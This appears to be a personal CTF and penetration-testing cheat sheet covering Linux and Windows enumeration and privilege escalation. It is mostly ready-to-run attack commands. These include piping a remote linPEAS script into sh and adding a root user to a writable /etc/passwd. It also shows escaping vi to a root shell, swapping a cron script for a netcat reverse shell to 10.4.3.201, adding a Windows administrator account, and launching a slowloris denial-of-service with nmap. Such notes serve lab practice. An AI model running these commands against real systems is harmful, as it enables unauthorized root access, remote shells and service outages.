
# Enumerate

On Linux ideally we would be looking for opportunities to gain access to a user account. 
SSH keys stored at `/home/<user>/.ssh` 

In CTFs it's also not infrequent to find credentials lying around somewhere on the box. 

Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

shows current users permissions
`sudo -l

first ssh into ip THEN
```
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
```

## LinEnum

[LinEnum GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

There are two ways to get LinEnum on the target machine. 

1. Go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **"python3 -m http.server 8000"** . Then using **"wget"** on the target machine, and your local IP, you can grab the file from your local machine. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
2. if you have sufficient permissions, copy the raw LinEnum code from your local machine and paste it into a new file on the target, using Vi or Nano. Once you've done this, you can save the file with the **".sh"** extension. Then make the file executable using the command **"chmod +x FILENAME.sh"**.

Start a server from the directory that contains LinEnum.sh
```bash
(raz㉿kali)-[~/LinEnum]
└─$ python -m http.server 9000
```
1. from the target use `wget http://10.4.3.201:9000/LinEnum.sh
3. `chmod +x LinEnum.sh
4. Run `./LinEnum.sh` to begin scan

##RootHelper


The RootHelper/Linux Smart Enumeration module is a LinEnum fork with a heavy focus on privilege escalation.
https://github.com/NullArray/RootHelper

---
# Priv Esc

## Exploiting SUID Files

SUID files: Look like
`-rwsr-xr-x
Notice the ***'S'***

ctrl+F to find this part of your LinEnum scan
```
[-] SUID files:
-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount
-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user5/script
-rwsr-xr-x 1 root root 8392 Jun 4 2019 /home/user3/shell
```
OR
Use this command to search the system for SUID/GUID files:
`find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files



## Exploiting a writable /etc/passwd

example entry of a user
`test:x:0:0:root:/root:/bin/bash

1. create a compliant password hash to add to our new user
`openssl passwd -1 -salt [salt] [password]
2. create a user entry to add onto /etc/passwd
```
nano /etc/passwd
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash"
```
3. switch to your new user and enter passwd
`su new`
4. you should have root
`sudo -i


## Escaping Vi Editor

use `sudo -l` to discover if that user can run any binaries with root privileges

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions

1. open vi as root, by typing `sudo vi`
2. type `:!sh` to open a shell!



## Exploiting Crontab

view scheduled cron jobs
`cat /etc/crontab

crontabs have the following format:
`<ID> <minute> <hour> <day of month> <month> <day of week> <user> <command>

1. create a reverse shell payload for the cronjob to run 
`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
2. replace the binary with the payload
`echo "mkfifo /tmp/ujlow; nc 10.4.3.201 8888 0</tmp/ujlow | /bin/sh >/tmp/ujlow 2>&1; rm /tmp/ujlow" > autoscript.sh`
3. start listener and wait for shell to land
`nc -lvnp 8888`

---
# Handy Nix Files

contains ssh configurations such as: PasswordAurhentication
	`etc/ssh/ssshd_config
A plain text file It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
	`/etc/passwd` 

---
## Windows 

VNC servers, for example, frequently leave passwords in the registry stored in plaintext. 

Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  or `C:\xampp\FileZilla Server\FileZilla Server.xml`  
- These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

---

# Now you're Here..

launche DOS attack using nmap scripts
`nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true

